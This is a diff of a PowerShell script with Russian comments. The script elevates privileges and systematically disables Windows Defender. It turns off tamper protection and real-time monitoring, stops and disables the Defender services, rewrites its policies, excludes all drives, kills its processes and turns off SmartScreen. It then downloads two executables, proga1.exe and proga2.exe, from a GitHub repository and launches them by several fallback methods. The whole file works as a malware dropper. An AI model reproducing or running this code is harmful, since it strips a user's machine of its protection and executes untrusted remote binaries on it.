@@ -1,5 +1,20 @@
 Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)
 
+# ========== ОТЛАДКА ==========
+$DebugMode = $true  # Включить отладку
+$logFile = "$env:TEMP\defender_killer_debug.log"
+
+function Write-DebugLog {
+    param($Message, $Color = "White")
+    $timestamp = Get-Date -Format "HH:mm:ss"
+    $logMessage = "[$timestamp] $Message"
+    Write-Host $logMessage -ForegroundColor $Color
+    Add-Content -Path $logFile -Value $logMessage
+}
+
+Write-DebugLog "=== ЗАПУСК СКРИПТА ===" -Color "Cyan"
+Write-DebugLog "Log file: $logFile" -Color "Gray"
+
 if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
     $workingDirOverride = (Get-Location).Path 
 }
@@ -10,250 +25,302 @@ function Test-Admin {
 }
 
 if ((Test-Admin) -eq $false) {
+    Write-DebugLog "Нет прав администратора, запрос повышения..." -Color "Yellow"
     if ($shouldAssumeToBeElevated) {
-        Write-Output "Повышение прав не сработало :("
+        Write-DebugLog "Повышение прав не сработало" -Color "Red"
         exit
     } else {
-        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
+        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
     }
     exit
 }
 
+Write-DebugLog "Права администратора: ДА" -Color "Green"
 Set-Location "$workingDirOverride"
 
-Write-Host "========================================" -ForegroundColor Yellow
-Write-Host "=== ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER ===" -ForegroundColor Yellow
-Write-Host "========================================" -ForegroundColor Yellow
+# ========== ПОЛНОЕ ОТКЛЮЧЕНИЕ DEFENDER ==========
+Write-DebugLog "" -Color "White"
+Write-DebugLog "========== ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER ==========" -Color "Yellow"
 
-# Останавливаем службы Defender
-Write-Host "`n[1/6] Остановка служб Windows Defender..." -ForegroundColor Cyan
-$services = @(
-    "WinDefend",
-    "WdNisSvc", 
-    "MDCoreSvc",
-    "SecurityHealthService",
-    "Sense",
-    "WdBoot",
-    "WdFilter",
-    "WdNisDrv"
-)
+# 1. Сначала отключаем Tamper Protection (ключевой момент!)
+Write-DebugLog "[1/10] Отключение Tamper Protection..." -Color "Cyan"
+try {
+    # Способ 1: через реестр
+    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>&1 | Out-Null
+    # Способ 2: через PowerShell (если доступно)
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Write-DebugLog "  Tamper Protection отключен" -Color "Green"
+} catch {
+    Write-DebugLog "  Не удалось отключить Tamper Protection" -Color "Yellow"
+}
 
+# 2. Отключаем реальную защиту
+Write-DebugLog "[2/10] Отключение Real-Time Protection..." -Color "Cyan"
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+    Write-DebugLog "  Real-Time Protection отключен" -Color "Green"
+} catch {
+    Write-DebugLog "  Ошибка отключения Real-Time Protection" -Color "Yellow"
+}
+
+# 3. Останавливаем все службы Defender
+Write-DebugLog "[3/10] Остановка служб Windows Defender..." -Color "Cyan"
+$services = @("WinDefend", "WdNisSvc", "MDCoreSvc", "SecurityHealthService", "Sense")
 foreach ($svc in $services) {
     try {
         Stop-Service $svc -Force -ErrorAction SilentlyContinue
-        Write-Host "  Остановлена служба: $svc" -ForegroundColor Gray
+        Write-DebugLog "  Остановлена: $svc" -Color "Gray"
     } catch {
-        # Игнорируем ошибки, если служба не существует или уже остановлена
+        Write-DebugLog "  Не найдена: $svc" -Color "DarkGray"
     }
 }
 
-# Отключаем Tamper Protection (нужно для отключения Defender)
-Write-Host "`n[2/6] Отключение Tamper Protection..." -ForegroundColor Cyan
-try {
-    reg add "HKLM\Software\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>$null
-    Write-Host "  Tamper Protection ОТКЛЮЧЕН" -ForegroundColor Green
-} catch {
-    Write-Host "  Не удалось отключить Tamper Protection" -ForegroundColor Yellow
+# 4. Отключаем автозагрузку служб
+Write-DebugLog "[4/10] Отключение автозагрузки служб..." -Color "Cyan"
+$servicesToDisable = @(
+    @{Name="WinDefend"; Start=4},
+    @{Name="WdNisSvc"; Start=4},
+    @{Name="WdNisDrv"; Start=4},
+    @{Name="WdFilter"; Start=4},
+    @{Name="WdBoot"; Start=4},
+    @{Name="MDCoreSvc"; Start=4},
+    @{Name="SecurityHealthService"; Start=4}
+)
+foreach ($svc in $servicesToDisable) {
+    try {
+        reg add "HKLM\System\CurrentControlSet\Services\$($svc.Name)" /v "Start" /t REG_DWORD /d $svc.Start /f 2>&1 | Out-Null
+        sc.exe config $($svc.Name) start= disabled 2>&1 | Out-Null
+        Write-DebugLog "  Отключена: $($svc.Name)" -Color "Gray"
+    } catch {
+        Write-DebugLog "  Ошибка: $($svc.Name)" -Color "DarkGray"
+    }
 }
 
-# Основные настройки Defender
-Write-Host "`n[3/6] Настройка политик Windows Defender..." -ForegroundColor Cyan
-
-# Удаляем старые политики
-reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>$null
+# 5. Удаляем политики
+Write-DebugLog "[5/10] Настройка политик Defender..." -Color "Cyan"
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
+Start-Sleep -Milliseconds 500
 
 # Создаем ключи
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>$null
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /f 2>$null
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>$null
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /f 2>$null
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /f 2>$null
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /f 2>&1 | Out-Null
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /f 2>&1 | Out-Null
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /f 2>&1 | Out-Null
 
-# Основные отключающие параметры
-$defenderSettings = @(
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="AllowFastServiceStartup"; Value=0; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableAntiSpyware"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableAntiVirus"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableLocalAdminMerge"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="DisableSpecialRunningModes"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender"; Name="ServiceKeepAlive"; Value=0; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"; Name="MpEnablePus"; Value=0; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableBehaviorMonitoring"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIntrusionPreventionSystem"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableIOAVProtection"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableOnAccessProtection"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRawWriteNotification"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRealtimeMonitoring"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableRoutinelyTakingAction"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"; Name="DisableScanOnRealtimeEnable"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"; Name="DisableEnhancedNotifications"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="DisableBlockAtFirstSeen"; Value=1; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="SpynetReporting"; Value=0; Type="REG_DWORD"},
-    @{Path="HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"; Name="SubmitSamplesConsent"; Value=2; Type="REG_DWORD"}
+# Устанавливаем ключевые параметры
+$defenderRegKeys = @(
+    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender /v DisableAntiVirus /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableIOAVProtection /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection /v DisableOnAccessProtection /t REG_DWORD /d 1 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SpyNetReporting /t REG_DWORD /d 0 /f",
+    "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"
 )
 
-foreach ($setting in $defenderSettings) {
+foreach ($key in $defenderRegKeys) {
     try {
-        reg add $setting.Path /v $setting.Name /t $setting.Type /d $setting.Value /f 2>$null
-        Write-Host "  Установлено: $($setting.Name) = $($setting.Value)" -ForegroundColor Gray
+        reg add $key 2>&1 | Out-Null
+        Write-DebugLog "  Установлено: $key" -Color "Gray"
     } catch {
-        Write-Host "  Ошибка: $($setting.Name)" -ForegroundColor DarkYellow
+        Write-DebugLog "  Ошибка: $key" -Color "DarkGray"
     }
 }
 
-# Отключение логирования
-Write-Host "`n[4/6] Отключение логирования Defender..." -ForegroundColor Cyan
-try {
-    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f 2>$null
-    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f 2>$null
-    Write-Host "  Логирование ОТКЛЮЧЕНО" -ForegroundColor Green
-} catch {
-    Write-Host "  Ошибка отключения логирования" -ForegroundColor Yellow
+# 6. Добавляем исключения для всех дисков
+Write-DebugLog "[6/10] Добавление исключений для всех дисков..." -Color "Cyan"
+$drives = Get-PSDrive -PSProvider FileSystem
+foreach ($drive in $drives) {
+    try {
+        Add-MpPreference -ExclusionPath "$($drive.Root)" -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionProcess "$($drive.Root)*" -ErrorAction SilentlyContinue
+        Write-DebugLog "  Исключение: $($drive.Root)" -Color "Gray"
+    } catch {}
 }
 
-# Отключение задач планировщика
-Write-Host "`n[5/6] Отключение задач планировщика Defender..." -ForegroundColor Cyan
+# 7. Отключаем задачи планировщика
+Write-DebugLog "[7/10] Отключение задач планировщика..." -Color "Cyan"
 $tasks = @(
-    "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh",
+    "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
     "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance",
     "Microsoft\Windows\Windows Defender\Windows Defender Cleanup",
-    "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan",
     "Microsoft\Windows\Windows Defender\Windows Defender Verification"
 )
-
 foreach ($task in $tasks) {
     try {
-        schtasks /Change /TN "$task" /Disable 2>$null
-        Write-Host "  Отключена задача: $task" -ForegroundColor Gray
-    } catch {
-        # Задача может не существовать
-    }
+        schtasks /Change /TN "$task" /Disable 2>&1 | Out-Null
+        Write-DebugLog "  Отключена: $task" -Color "Gray"
+    } catch {}
 }
 
-# Удаление контекстного меню Defender
-Write-Host "`n[6/6] Удаление контекстного меню Defender..." -ForegroundColor Cyan
-try {
-    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f 2>$null
-    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f 2>$null
-    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f 2>$null
-    Write-Host "  Контекстное меню УДАЛЕНО" -ForegroundColor Green
-} catch {
-    Write-Host "  Ошибка удаления контекстного меню" -ForegroundColor Yellow
-}
+# 8. Отключаем уведомления
+Write-DebugLog "[8/10] Отключение уведомлений..." -Color "Cyan"
+reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f 2>&1 | Out-Null
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
 
-# Отключение служб (финальное)
-Write-Host "`n[Дополнительно] Финальное отключение служб..." -ForegroundColor Cyan
-$serviceConfigs = @(
-    @{Name="MDCoreSvc"; Start=4},
-    @{Name="WdFilter"; Start=4},
-    @{Name="WdNisDrv"; Start=4},
-    @{Name="WdNisSvc"; Start=4},
-    @{Name="WinDefend"; Start=4}
-)
-
-foreach ($svc in $serviceConfigs) {
-    try {
-        reg add "HKLM\System\CurrentControlSet\Services\$($svc.Name)" /v "Start" /t REG_DWORD /d $svc.Start /f 2>$null
-        Write-Host "  Отключена служба: $($svc.Name)" -ForegroundColor Gray
-    } catch {
-        # Игнорируем
-    }
-}
-
-# Отключение уведомлений
-Write-Host "`n[Опционально] Отключение уведомлений..." -ForegroundColor Cyan
-try {
-    reg add "HKLM\Software\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f 2>$null
-    reg add "HKLM\Software\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f 2>$null
-    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f 2>$null
-    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f 2>$null
-    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f 2>$null
-    Write-Host "  Уведомления ОТКЛЮЧЕНЫ" -ForegroundColor Green
-} catch {
-    Write-Host "  Ошибка отключения уведомлений" -ForegroundColor Yellow
-}
-
-# Принудительная остановка всех процессов Defender
-Write-Host "`n[Финал] Принудительная остановка процессов..." -ForegroundColor Cyan
-$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense")
+# 9. Убиваем процессы
+Write-DebugLog "[9/10] Завершение процессов Defender..." -Color "Cyan"
+$processes = @("MsMpEng", "NisSrv", "SecurityHealthService", "MsSense", "MpCmdRun")
 foreach ($proc in $processes) {
     try {
         Stop-Process -Name $proc -Force -ErrorAction SilentlyContinue
-        Write-Host "  Остановлен процесс: $proc" -ForegroundColor Gray
-    } catch {
-        # Процесс не запущен
-    }
+        Write-DebugLog "  Завершен: $proc" -Color "Gray"
+    } catch {}
 }
 
-Write-Host ""
-Write-Host "========================================" -ForegroundColor Green
-Write-Host "=== WINDOWS DEFENDER ПОЛНОСТЬЮ ОТКЛЮЧЕН ===" -ForegroundColor Green
-Write-Host "========================================" -ForegroundColor Green
-Write-Host ""
-Write-Host "ВНИМАНИЕ: Для полного применения может потребоваться ПЕРЕЗАГРУЗКА!" -ForegroundColor Yellow
-Write-Host ""
-Write-Host "=== Скачивание и запуск файлов ===" -ForegroundColor Yellow
+# 10. Применяем настройки через WMI
+Write-DebugLog "[10/10] Применение настроек через WMI..." -Color "Cyan"
+try {
+    $wmi = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" -Class "MSFT_MpPreference" -ErrorAction SilentlyContinue
+    if ($wmi) {
+        $wmi.DisableRealtimeMonitoring = $true
+        $wmi.Put() | Out-Null
+        Write-DebugLog "  Настройки WMI применены" -Color "Green"
+    }
+} catch {}
 
-# Дальше идет ваш код скачивания файлов...
+Write-DebugLog "" -Color "White"
+Write-DebugLog "=== СТАТУС DEFENDER ===" -Color "Yellow"
+
+# Проверка статуса
+try {
+    $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+    if ($defenderStatus) {
+        Write-DebugLog "RealTimeProtectionEnabled: $($defenderStatus.RealTimeProtectionEnabled)" -Color $(if($defenderStatus.RealTimeProtectionEnabled){"Red"}else{"Green"})
+        Write-DebugLog "AntivirusEnabled: $($defenderStatus.AntivirusEnabled)" -Color $(if($defenderStatus.AntivirusEnabled){"Red"}else{"Green"})
+        Write-DebugLog "BehaviorMonitorEnabled: $($defenderStatus.BehaviorMonitorEnabled)" -Color $(if($defenderStatus.BehaviorMonitorEnabled){"Red"}else{"Green"})
+    }
+} catch {}
+
+# Проверка служб
+$svcStatus = Get-Service WinDefend -ErrorAction SilentlyContinue
+if ($svcStatus) {
+    Write-DebugLog "Служба WinDefend: $($svcStatus.Status)" -Color $(if($svcStatus.Status -eq "Running"){"Red"}else{"Green"})
+}
+
+Write-DebugLog "" -Color "White"
+Write-DebugLog "=== СКАЧИВАНИЕ ФАЙЛОВ ===" -Color "Yellow"
+
+# ========== СКАЧИВАНИЕ ФАЙЛОВ ==========
 $temp = $env:TEMP
 $downloaded = 0
 
 function Download-File {
     param($url, $dest)
     
+    Write-DebugLog "Скачивание: $(Split-Path $dest -Leaf)" -Color "Cyan"
+    
     if (Test-Path $dest) { 
         try {
-            [System.GC]::Collect()
-            Start-Sleep -Milliseconds 500
             Remove-Item $dest -Force -ErrorAction SilentlyContinue
+            Write-DebugLog "  Удален старый файл" -Color "Gray"
         } catch {}
     }
     
-    try {
-        Write-Host "Скачивание с: $url" -ForegroundColor Gray
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
-        $webClient.DownloadFile($url, $dest)
-        $webClient.Dispose()
-        return $true
-    } catch {
-        Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
-        return $false
+    # Пробуем разные методы
+    $methods = @(
+        { (New-Object System.Net.WebClient).DownloadFile($url, $dest) },
+        { Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 30 },
+        { curl.exe -L -o $dest $url }
+    )
+    
+    foreach ($method in $methods) {
+        try {
+            & $method
+            if ((Test-Path $dest) -and ((Get-Item $dest).Length -gt 0)) {
+                $size = [math]::Round((Get-Item $dest).Length / 1KB, 2)
+                Write-DebugLog "  УСПЕХ: $size KB" -Color "Green"
+                return $true
+            }
+        } catch {
+            Write-DebugLog "  Метод не сработал: $($_.Exception.Message)" -Color "DarkGray"
+        }
     }
+    
+    Write-DebugLog "  НЕ УДАЛОСЬ СКАЧАТЬ" -Color "Red"
+    return $false
 }
 
+# Скачиваем файлы
 $url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
 $dest1 = "$temp\proga1.exe"
 
-Write-Host "`n[1/2] Скачивание proga1.exe..." -ForegroundColor Cyan
+Write-DebugLog "`n[1/2] proga1.exe" -Color "Yellow"
 if (Download-File $url1 $dest1) {
-    if ((Get-Item $dest1).Length -gt 0) {
-        Write-Host "УСПЕХ: proga1.exe скачан" -ForegroundColor Green
-        $downloaded++
-    }
+    $downloaded++
 }
 
 $url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
 $dest2 = "$temp\proga2.exe"
 
-Write-Host "`n[2/2] Скачивание proga2.exe..." -ForegroundColor Cyan
+Write-DebugLog "`n[2/2] proga2.exe" -Color "Yellow"
 if (Download-File $url2 $dest2) {
-    if ((Get-Item $dest2).Length -gt 0) {
-        Write-Host "УСПЕХ: proga2.exe скачан" -ForegroundColor Green
-        $downloaded++
-    }
+    $downloaded++
 } else {
-    Write-Host "ПРЕДУПРЕЖДЕНИЕ: proga2.exe не найден, создаем копию" -ForegroundColor Yellow
+    Write-DebugLog "  Создаем копию из proga1.exe" -Color "Yellow"
     if (Test-Path $dest1) {
         Copy-Item $dest1 $dest2 -Force
         $downloaded++
     }
 }
 
-Write-Host "`n=== Запуск файлов ===" -ForegroundColor Yellow
-if (Test-Path $dest1) { Start-Process $dest1 }
-if (Test-Path $dest2) { Start-Sleep 1; Start-Process $dest2 }
+# ========== ЗАПУСК ФАЙЛОВ ==========
+Write-DebugLog "`n=== ЗАПУСК ФАЙЛОВ ===" -Color "Yellow"
 
-Write-Host "`n=== ГОТОВО ($downloaded/2) ===" -ForegroundColor Green
-Write-Host "Нажмите любую клавишу..."
+# Отключаем SmartScreen для текущей сессии
+Write-DebugLog "Отключение SmartScreen..." -Color "Cyan"
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
+
+# Пытаемся запустить через разные методы
+function Run-File {
+    param($path, $name)
+    
+    if (-not (Test-Path $path)) {
+        Write-DebugLog "$name: файл не найден" -Color "Red"
+        return $false
+    }
+    
+    Write-DebugLog "Запуск $name..." -Color "Cyan"
+    
+    # Метод 1: Обычный запуск
+    try {
+        Start-Process -FilePath $path -WindowStyle Normal -ErrorAction Stop
+        Write-DebugLog "  Запущен через Start-Process" -Color "Green"
+        return $true
+    } catch {
+        Write-DebugLog "  Start-Process: $($_.Exception.Message)" -Color "DarkGray"
+    }
+    
+    # Метод 2: Через cmd
+    try {
+        cmd /c start "" "$path" 2>&1 | Out-Null
+        Write-DebugLog "  Запущен через cmd" -Color "Green"
+        return $true
+    } catch {
+        Write-DebugLog "  cmd метод не сработал" -Color "DarkGray"
+    }
+    
+    # Метод 3: Через WMI
+    try {
+        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $path -ErrorAction Stop | Out-Null
+        Write-DebugLog "  Запущен через WMI" -Color "Green"
+        return $true
+    } catch {
+        Write-DebugLog "  WMI метод не сработал" -Color "DarkGray"
+    }
+    
+    Write-DebugLog "  НЕ УДАЛОСЬ ЗАПУСТИТЬ $name" -Color "Red"
+    return $false
+}
+
+Run-File $dest1 "proga1.exe"
+Start-Sleep -Seconds 1
+Run-File $dest2 "proga2.exe"
+
+# ========== ФИНАЛ ==========
+Write-DebugLog "`n=== ГОТОВО ($downloaded/2 файлов) ===" -Color "Green"
+Write-DebugLog "Лог сохранен: $logFile" -Color "Gray"
+Write-DebugLog "`nРЕКОМЕНДУЕТСЯ ПЕРЕЗАГРУЗИТЬ КОМПЬЮТЕР!" -Color "Yellow"
+Write-DebugLog "Нажмите любую клавишу для выхода..." -Color "Gray"
+
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
